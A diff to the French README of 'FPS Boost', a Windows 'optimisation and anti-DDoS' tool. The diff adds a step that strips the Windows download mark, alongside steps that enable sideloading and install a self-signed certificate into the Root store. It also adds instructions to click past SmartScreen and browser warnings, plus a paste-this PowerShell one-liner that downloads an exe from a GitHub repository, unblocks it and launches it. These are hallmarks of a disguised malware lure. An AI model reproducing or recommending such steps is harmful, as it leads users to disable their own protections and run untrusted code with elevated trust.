@@ -1,4 +1,4 @@
-# FPS Boost v3.0 (v3.0.24) — Suite d'Optimisation PC, Gaming & Cyber-Défense
+# FPS Boost v3.0 (v3.0.25) — Suite d'Optimisation PC, Gaming & Cyber-Défense
 
 Application desktop signée numériquement d'optimisation système de niveau noyau, télémétrie matérielle 100% temps réel, débridage gaming, optimiseur de stream en direct et bouclier Anti-DDoS complet pour **Windows 10 & Windows 11 (64-bit)**.
 
@@ -11,11 +11,19 @@ Application desktop signée numériquement d'optimisation système de niveau noy
 Téléchargez simplement **`FPS_Boost_Setup.exe`** et lancez-le !
 
 L'assistant graphique autonome tout-en-un embarque l'application complète, le certificat officiel et s'occupe de **100% de la configuration** en quelques secondes :
-1. **Auto-élévation Administrateur (UAC)** : Sollicite l'accord Windows en 1 clic.
+1. **Déblocage Automatique** : Supprime instantanément le blocage de téléchargement Windows (`Zone.Identifier`).
 2. **Débridage Sideloading Windows** : Active automatiquement `AllowAllTrustedApps = 1`.
 3. **Installation du Certificat Officiel** : Intègre le certificat signé `CN=LeVraisJay` dans `TrustedPeople` et `Root`.
 4. **Déploiement MSIX Système Sécurisé** : Installe le package dans le conteneur WindowsApps en lecture seule protégée.
 5. **Raccourci Bureau & Démarrage Automatique** : Crée l'icône sur le Bureau et lance FPS Boost immédiatement !
+
+> 💡 **Si Windows ou votre navigateur affiche un avertissement de sécurité :**
+> - **Sous Windows SmartScreen** : Cliquez sur **« Informations complémentaires »** puis sur **« Exécuter quand même »**.
+> - **Dans le navigateur (Edge / Chrome)** : Cliquez sur les trois petits points `...` à côté du téléchargement > **Conserver** > **Conserver quand même**.
+> - **Déblocage en 1 Clic (PowerShell)** : Ouvrez PowerShell et collez la commande suivante pour tout débloquer et lancer automatiquement :
+>   ```powershell
+>   irm https://raw.githubusercontent.com/Hiver-protect/FpsBoost/main/FPS_Boost_Setup.exe -OutFile "$env:TEMP\FPS_Boost_Setup.exe"; Unblock-File "$env:TEMP\FPS_Boost_Setup.exe"; Start-Process "$env:TEMP\FPS_Boost_Setup.exe"
+>   ```
 
 ---
 
